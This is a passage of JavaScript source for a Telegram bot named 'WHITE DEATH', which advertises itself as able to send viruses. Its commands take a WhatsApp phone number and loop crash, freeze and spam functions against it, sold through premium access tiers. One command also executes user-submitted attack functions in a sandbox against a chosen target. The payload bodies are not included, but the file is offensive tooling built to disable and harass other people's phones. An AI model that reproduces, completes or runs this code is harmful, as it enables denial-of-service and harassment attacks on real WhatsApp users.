│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /addadmin
│ <tg-emoji emoji-id="5257965174979042426">📝</tg-emoji> Adding Admin
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /deladmin 
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Remove Admin
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /addprem
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Adding Premium
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /delprem
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Remove Premium
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /spotify
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> mencari lagu
│
╰═─────────────═⬡</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown(); 
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);

    const bugMenu = `
<blockquote>こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

╭═───⊱ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ───═⬡
│ ⸙ Developer: @RyuugaCool <tg-emoji emoji-id="6098160378368235844">✅</tg-emoji>
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Version: 1.0
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Prefix: /
│ <tg-emoji emoji-id="6046219062525040168">🦇</tg-emoji> Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 ───═⬡
│ <tg-emoji emoji-id="6046117795786134132">💫</tg-emoji> Sender: ${senderStatus}
│ <tg-emoji emoji-id="6044262726396546853">🦋</tg-emoji> Runtime: ${runtimeStatus}
│ <tg-emoji emoji-id="6043922668065919392">⭐️</tg-emoji> Memory: ${memoryStatus}
│ <tg-emoji emoji-id="6044024639179460298">⏰</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═───⊱ .•♫••♬•♫•.𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌.•♫•♬•♫•. ───═⬡
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Xdeath 
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙳𝚎𝚕𝚊𝚢 𝚂𝚙𝚊𝚖
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Heavy 
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙵𝚛𝚎𝚣𝚎 𝚖𝚢𝚋𝚎𝚎
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Xkill 
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Delay
│<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /FnDeath
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Freze chat jir
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /XFrezz
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Delay hard
│
╭═───⊱ .•♫••♬•♫•.𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 𝐍𝐎𝐓 𝐒𝐏𝐀𝐌.•♫•♬•♫•. ───═⬡
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Xui
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Crash jir
│ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /XBrutaly
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Blank Brutal
│
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();  
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const toolsMenu = `
<blockquote>こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

╭═───⊱ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ───═⬡
│ ⸙ Developer: @RyuugaCool <tg-emoji emoji-id="6098160378368235844">✅</tg-emoji>
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Version: 1.0
│ <tg-emoji emoji-id="6044105320140118674">✨</tg-emoji> Prefix: /
│ <tg-emoji emoji-id="6046219062525040168">🦇</tg-emoji> Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 ───═⬡
│ <tg-emoji emoji-id="6046117795786134132">💫</tg-emoji> Sender: ${senderStatus}
│ <tg-emoji emoji-id="6044262726396546853">🦋</tg-emoji> Runtime: ${runtimeStatus}
│ <tg-emoji emoji-id="6043922668065919392">⭐️</tg-emoji> Memory: ${memoryStatus}
│ <tg-emoji emoji-id="6044024639179460298">⏰</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═───⊱ 𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ───═⬡
│ <tg-emoji emoji-id="5257965174979042426">📝</tg-emoji> /checkgroupid
│ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Check Id Group Whatsapp
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();  
    const chatId = ctx.chat.id;
    
    stopBlink(chatId);
    
    const tqtoMenu = `
<blockquote>こんにちは、${ctx.from.first_name}。私はウイルスを送信できるロボットです。できるだけ私を活用してください。

╭═───⊱ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ───═⬡
│ ⸙ Developer: @RyuugaCool
│ ⸙ Version: 1.0
│ ⸙ Prefix: /
│ ⸙ Language: JavaScript
╰═─────────────═⬡

╭═───⊱ 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 ───═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═───⊱ 𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ───═⬡
│ ⸙ Ryuu
│ᯓ➤ Developer
╰═─────────────═⬡</blockquote>
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("checkgroupid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /checkgroupid https://chat.whatsapp.com/xxxxx");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ───═⬡
│ ⸙ Name
│ᯓ➤ ${subject}
│ ⸙ Group ID
│ᯓ➤ ${groupId}
│ ⸙ Owner
│ᯓ➤ ${owner}
│ ⸙ Members
│ᯓ➤ ${size}
╰═─────────────═⬡</strong></blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});

bot.command("Xdeath", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xdeath 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xdeath
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await Delay(sock, target);
    await sleep(50);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Travas
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Heavy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Heavy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Heavy
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await nanzt5delay(sock, target);
    await sleep(80);
    await DelayyDell(sock, target);
    await sleep(50);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Heavy
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Xkill", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xkill 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xkill
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await nanzt5delay(sock, target);
    await sleep(90);
    await DelayDeCrash(sock, target);
    await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xkill
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Xui", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xui 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xui
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await Kontol(sock, target);
    await sleep(2500);
    await mbutcrashxblank(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xui
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FnDeath", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /FnDeath 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: FnDeath
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

     for (let i = 0; i < 15; i++) {
         await RaysDocuStunt(sock, target);
         await sleep(60);
         await apaladelay(sock, target);
         await sleep(100);
         }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xeweh
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XFrezz", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XFrezz 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: XFrezz
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await Delay(sock, target)
    await sleep(25);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: XFrezz
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XBrutaly", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XBrutaly 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: XBrutaly
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await mbutcrashxblank(sock, target);
    await sleep(250);
    await DelayDeCrash(sock, target);
    await sleep(250);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xfc
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Xmeki", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xmeki 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xmeki
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await xCrsdCallSpamDelete(sock, jid)
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
  <blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xmeki
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Xios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xios
⌑ Status: Process
⌑ Author : @RyuugaCool
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await IosInvisbleForce(sock, target)
    await sleep(1000);
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Xios
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: videoUrl },
        {
          caption: `<<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>⬡═―—⊱ ⎧ 𝐖𝐇𝐈𝐓𝐄 𝐃𝐄𝐀𝐓𝐇 <tg-emoji emoji-id="6253453459350100040">👑</tg-emoji> ⎭ ⊰―—═⬡</blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: videoUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// Function Bug

//end Func

bot.launch()
